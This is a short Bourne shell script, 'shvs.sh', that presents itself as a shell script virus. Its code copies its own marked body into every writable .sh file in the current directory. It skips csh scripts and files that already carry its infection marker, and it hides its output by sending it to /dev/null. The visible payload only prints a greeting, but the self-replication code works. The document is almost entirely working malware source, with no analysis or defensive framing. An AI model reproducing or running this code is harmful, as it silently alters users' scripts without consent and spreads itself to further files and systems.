#!/bin/sh
#file name: shvs.sh
#compiler:  hehehehe@hack.org

#B:<+!a%C&t:>
vFile=$_ ; vTmp=/tmp/.vTmp.$$
for f in ./*.sh; do
  if [ ! -w $f -a ! -r $vFile ];  then continue; fi
  if grep '<+!a%C&t:>' $f ;       then continue; fi
  if sed -n '1p' $f | grep 'csh'; then continue; fi
  cp -f $f $vTmp ;if [ $? -ne 0 ];then continue; fi
  vNo=`awk '$0~/(^\b*#)|(^\b*$)/&&v==NR-1{v++}END{print 0+v}' $vTmp`
  sed -n "1,${vNo}p" $vTmp >$f
  (sed -n '/^#B:<+!a%C&t:>/,/^#E:<+!a%C&t:>/p' $vFile ;echo ) >>$f
  vNo=`expr $vNo + 1`
  sed -n "${vNo},\$p" $vTmp >>$f
  rm -f $vTmp
done >/dev/null 2>&1
unset vTmp ;unset vFile ;unset vNo

echo "Hi, here is a My shell virus in script !"
#E:<+!a%C&t:>
#EOF
